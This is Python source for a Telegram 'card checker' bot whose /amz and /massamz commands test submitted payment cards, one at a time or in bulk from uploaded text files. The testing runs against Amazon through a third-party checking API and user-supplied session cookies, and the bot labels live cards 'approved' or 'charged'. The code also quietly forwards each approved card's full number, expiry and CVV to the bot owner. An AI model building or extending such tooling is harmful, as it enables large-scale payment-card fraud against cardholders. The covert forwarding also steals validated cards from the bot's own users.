"""Amazon check handlers — /amz (single), /massamz (mass).

Uses the Leviatan Amazon CHK API.
Requires user to set cookies first via /setcookies.
"""

import logging
import asyncio
import time
from datetime import datetime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ContextTypes,
    CommandHandler,
    MessageHandler,
    ConversationHandler,
    filters,
)

from core.card_parser import parse_card, parse_card_list, luhn_valid, is_expired
from core.amazon_checker import (
    amazon_check_single,
    amazon_check_batch,
    AmazonResult,
    is_cookie_expired,
)
from core.database import (
    is_banned,
    get_or_create_user,
    get_user_cookies,
    increment_check_stats,
    log_amazon_check,
)
from core.rate_limiter import rate_limiter, get_cooldown_message
from core.bin_lookup import BinLookup, get_flag
from templates.messages import (
    format_amazon_check,
    format_amazon_checking,
    format_amazon_usage,
    format_massamz_usage,
    format_cookies_missing,
    format_error,
    format_banned,
)
from templates.emojis import e_lightning, e_memo, e_cross, e_check_done, e_heart

logger = logging.getLogger(__name__)

DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━"
BOLD = lambda s: f"<b>{s}</b>"
CODE = lambda s: f"<code>{s}</code>"

# Conversation state for /massamz
WAITING_FOR_AMZ_FILE = 2


async def amz_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /amz — single Amazon card check."""
    user = update.effective_user
    conn = ctx.bot_data["db"]

    get_or_create_user(conn, user.id, user.username, user.first_name)

    if is_banned(conn, user.id):
        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
        return

    # Rate limit
    allowed, remaining = rate_limiter.check_command_cooldown(user.id, "amz")
    if not allowed:
        await update.message.reply_text(get_cooldown_message("/amz", remaining))
        return

    # Parse card
    raw_card = None
    if ctx.args:
        raw_card = " ".join(ctx.args)
    elif update.message.reply_to_message:
        raw_card = update.message.reply_to_message.text

    if not raw_card:
        await update.message.reply_text(format_amazon_usage(), parse_mode=ParseMode.HTML)
        return

    card = parse_card(raw_card)
    if not card:
        await update.message.reply_text(
            format_error("Invalid card format. Use: number|month|year|cvv"),
            parse_mode=ParseMode.HTML,
        )
        return

    if not luhn_valid(card.number):
        await update.message.reply_text(
            format_error("Card fails Luhn check."), parse_mode=ParseMode.HTML,
        )
        return

    if is_expired(card.month, card.year):
        await update.message.reply_text(
            format_error("Card is expired."), parse_mode=ParseMode.HTML,
        )
        return

    # Check cookies
    cookie_row = get_user_cookies(conn, user.id, "amazon")
    if not cookie_row or not cookie_row["cookies"]:
        await update.message.reply_text(format_cookies_missing(), parse_mode=ParseMode.HTML)
        return
    cookies = cookie_row["cookies"]

    # Send checking message
    checking_msg = await update.message.reply_text(
        format_amazon_checking(card), parse_mode=ParseMode.HTML,
    )

    # Run Amazon check (no proxy — API blocks proxies)
    result = await amazon_check_single(card, cookies)

    # BIN lookup
    bin_lookup: BinLookup = ctx.bot_data["bin_lookup"]
    bin_info = await bin_lookup.lookup(card.bin)
    flag = get_flag(bin_info.get("country", ""))

    # Format result
    text = format_amazon_check(
        status=result.status,
        card=card,
        response=result.message,
        bin_info=bin_info,
        flag=flag,
    )

    await checking_msg.edit_text(text, parse_mode=ParseMode.HTML)

    # Update stats (approved → charged, declined → dead, error → dead)
    if result.status == "APPROVED":
        increment_check_stats(conn, user.id, "charged", 1)
    else:
        increment_check_stats(conn, user.id, "dead", 1)

    # If cookie expired, notify user
    if is_cookie_expired(result):
        await update.message.reply_text(
            format_cookies_missing(), parse_mode=ParseMode.HTML,
        )

    # Forward approved cards to owner
    if result.status == "APPROVED":
        try:
            owner_id = ctx.bot_data["config"]["bot"]["owner_id"]
            await ctx.bot.send_message(
                chat_id=owner_id,
                text=(
                    f"🤍 AMAZON APPROVED 🤍\n\n"
                    f"💳 CC : {card.raw}\n"
                    f"🛒 Gateway : Amazon Auth (Leviatan)\n"
                    f"📝 Response : {result.message}\n"
                    f"👤 User : {user.id} ({user.username})\n\n"
                    f"💳 BIN: {card.bin}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.warning("Failed to forward Amazon approved card to owner: %s", e)

    logger.info(
        "Amazon check: user=%d card=%s status=%s",
        user.id, card.masked, result.status,
    )


async def massamz_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /massamz — start mass Amazon check conversation.

    Step 1: Check cookies, ask for .txt file.
    """
    user = update.effective_user
    conn = ctx.bot_data["db"]

    get_or_create_user(conn, user.id, user.username, user.first_name)

    if is_banned(conn, user.id):
        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
        return ConversationHandler.END

    # Rate limit
    allowed, remaining = rate_limiter.check_command_cooldown(user.id, "massamz")
    if not allowed:
        await update.message.reply_text(get_cooldown_message("/massamz", remaining))
        return ConversationHandler.END

    # Check cookies first
    cookie_row = get_user_cookies(conn, user.id, "amazon")
    if not cookie_row or not cookie_row["cookies"]:
        await update.message.reply_text(format_cookies_missing(), parse_mode=ParseMode.HTML)
        return ConversationHandler.END

    # Check not already running a mass check
    can_start, active = rate_limiter.can_start_mass(user.id)
    if not can_start:
        from core.rate_limiter import get_mass_active_message
        await update.message.reply_text(get_mass_active_message())
        return ConversationHandler.END

    # Store cookies in context for the file-receive step
    ctx.user_data["amz_cookies"] = cookie_row["cookies"]

    await update.message.reply_text(
        f"{e_memo()} {BOLD('Mass Amazon Check')}\n{DIVIDER}\n\n"
        f"Send a {CODE('.txt')} file with cards.\n"
        f"One card per line: {CODE('NUMBER|MM|YYYY|CVV')}\n\n"
        f"{e_lightning()} Using Leviatan Amazon API\n"
        f"{DIVIDER}",
        parse_mode=ParseMode.HTML,
    )
    return WAITING_FOR_AMZ_FILE


async def receive_amz_card_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Receive .txt file for mass Amazon check and run the check."""
    user = update.effective_user
    conn = ctx.bot_data["db"]

    cookies = ctx.user_data.get("amz_cookies")
    if not cookies:
        # Re-fetch from DB as fallback
        cookie_row = get_user_cookies(conn, user.id, "amazon")
        if not cookie_row:
            await update.message.reply_text(
                format_cookies_missing(), parse_mode=ParseMode.HTML,
            )
            rate_limiter.cancel_mass(user.id)
            return ConversationHandler.END
        cookies = cookie_row["cookies"]

    # Download and parse the file
    document = update.message.document
    if not document:
        await update.message.reply_text(
            format_error("Please send a .txt file."), parse_mode=ParseMode.HTML,
        )
        rate_limiter.cancel_mass(user.id)
        return ConversationHandler.END

    try:
        file = await document.get_file()
        raw_bytes = await file.download_as_bytearray()
        text = raw_bytes.decode("utf-8", errors="replace")
    except Exception as e:
        logger.warning("Failed to download massamz file: %s", e)
        await update.message.reply_text(
            format_error("Failed to read file."), parse_mode=ParseMode.HTML,
        )
        rate_limiter.cancel_mass(user.id)
        return ConversationHandler.END

    cards = parse_card_list(text)
    if not cards:
        await update.message.reply_text(
            format_error("No valid cards found in file."), parse_mode=ParseMode.HTML,
        )
        rate_limiter.cancel_mass(user.id)
        return ConversationHandler.END

    # Tier limit
    from core.tier_manager import get_user_config
    tier_config = get_user_config(conn, user.id)
    card_limit = tier_config["card_limit"]
    if len(cards) > card_limit:
        cards = cards[:card_limit]
        await update.message.reply_text(
            f"🫦 {BOLD(str(len(cards)))} cards — Tier limit {BOLD(str(card_limit))}. "
            f"Checking first {BOLD(str(card_limit))}.",
            parse_mode=ParseMode.HTML,
        )

    # Send initial progress message
    progress_msg = await update.message.reply_text(
        f"{e_lightning()} 𝐀𝐔𝐑𝐎𝐑𝐀 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 {e_lightning()}\n{DIVIDER}\n\n"
        f"{e_memo()} {BOLD('Mass Amazon Check')}\n\n"
        f"{e_lightning()} {BOLD('Starting...')}\n\n{DIVIDER}",
        parse_mode=ParseMode.HTML,
    )

    # Run the mass check
    await _run_mass_amazon(
        cards=cards,
        cookies=cookies,
        conn=conn,
        user_id=user.id,
        bot=ctx.bot,
        chat_id=update.effective_chat.id,
        message_id=progress_msg.message_id,
        owner_id=ctx.bot_data["config"]["bot"]["owner_id"],
    )

    # Clean up
    ctx.user_data.pop("amz_cookies", None)
    rate_limiter.end_mass(user.id)
    return ConversationHandler.END


async def cancel_massamz(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Cancel a mass Amazon check conversation."""
    user = update.effective_user
    rate_limiter.cancel_mass(user.id)
    ctx.user_data.pop("amz_cookies", None)
    await update.message.reply_text(
        f"{e_cross()} Mass Amazon check cancelled.", parse_mode=ParseMode.HTML,
    )
    return ConversationHandler.END


async def _run_mass_amazon(cards, cookies, conn, user_id, bot, chat_id,
                           message_id, owner_id):
    """Run the mass Amazon check with progress updates.

    Sends cards in batches to the Leviatan API (multi-card support).
    Updates the progress message every 3 seconds.
    """
    from templates.messages import (
        format_amazon_mass_progress,
        format_amazon_mass_complete,
        format_amazon_approved_list,
    )
    from core.amazon_checker import BATCH_SIZE, is_cookie_expired

    total = len(cards)
    checked = 0
    approved_cards = []
    approved_count = 0
    declined_count = 0
    error_count = 0
    start_time = time.time()
    last_update = 0
    cookie_expired = False

    # Process in batches
    for i in range(0, total, BATCH_SIZE):
        batch = cards[i:i + BATCH_SIZE]
        results = await amazon_check_batch(batch, cookies)

        for card, result in zip(batch, results):
            checked += 1
            if result.status == "APPROVED":
                approved_count += 1
                approved_cards.append((card, result.message))
            elif result.status == "DECLINED":
                declined_count += 1
            else:
                error_count += 1
                if is_cookie_expired(result):
                    cookie_expired = True

        # Progress update (every 3 seconds)
        now = time.time()
        if now - last_update >= 3 or checked >= total:
            last_update = now
            elapsed = now - start_time
            duration = _format_duration(elapsed)
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=format_amazon_mass_progress(
                        total, checked, duration,
                        approved_count, declined_count, error_count,
                    ),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass

        # Early exit: cookies expired — no point continuing
        if cookie_expired and approved_count == 0 and i == 0:
            try:
                await bot.send_message(
                    chat_id=chat_id,
                    text=format_cookies_missing(),
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
            break

    # Final summary
    elapsed = time.time() - start_time
    duration = _format_duration(elapsed)

    complete_text = format_amazon_mass_complete(
        total, duration, approved_count, declined_count, error_count,
    )
    try:
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=complete_text,
            parse_mode=ParseMode.HTML,
        )
    except Exception:
        pass

    # Send approved cards list (if any)
    if approved_cards:
        approved_text = format_amazon_approved_list(approved_cards)
        try:
            await bot.send_message(
                chat_id=chat_id,
                text=approved_text,
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.warning("Failed to send Amazon approved list: %s", e)

    # Update DB stats
    increment_check_stats(conn, user_id, "charged", approved_count)
    increment_check_stats(conn, user_id, "dead", declined_count + error_count)
    log_amazon_check(conn, user_id, total, approved_count, declined_count, error_count, elapsed)

    # Forward approved cards to owner
    for card, msg in approved_cards:
        try:
            await bot.send_message(
                chat_id=owner_id,
                text=(
                    f"🤍 AMAZON APPROVED 🤍\n\n"
                    f"💳 CC : {card.raw}\n"
                    f"🛒 Gateway : Amazon Auth (Leviatan)\n"
                    f"📝 Response : {msg}\n"
                    f"👤 User : {user_id}\n\n"
                    f"💳 BIN: {card.bin}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                ),
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.warning("Failed to forward Amazon approved card: %s", e)

    logger.info(
        "Mass Amazon: user=%d total=%d approved=%d declined=%d errors=%d dur=%s",
        user_id, total, approved_count, declined_count, error_count, duration,
    )


def _format_duration(seconds: float) -> str:
    """Format seconds into 'Xm Ys' string."""
    m = int(seconds // 60)
    s = int(seconds % 60)
    return f"{m}m {s}s"
